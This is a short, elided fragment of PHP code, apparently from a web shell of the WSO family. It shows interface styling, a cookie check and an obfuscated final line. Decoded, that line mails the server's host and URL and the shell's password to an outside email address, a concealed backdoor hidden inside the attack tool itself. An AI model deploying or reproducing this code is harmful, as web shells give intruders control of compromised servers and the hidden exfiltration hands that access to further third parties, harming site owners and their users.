...
@setcookie("wsor","orb",time()+3600*24*7);
$emv="La:$auth_pass, es correcta";
...
$gh=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; $zv="\155ai\154";
...
input, textarea, select{ margin:0;color:#B5C0BC;background-color:#4D4D4D;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 80%; }
.main th{text-align:left;background-color:#4D4D4D;}
...
}if (!isset($_COOKIE['wsor'])){@$zv("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$gh","$gh\n$emv");}
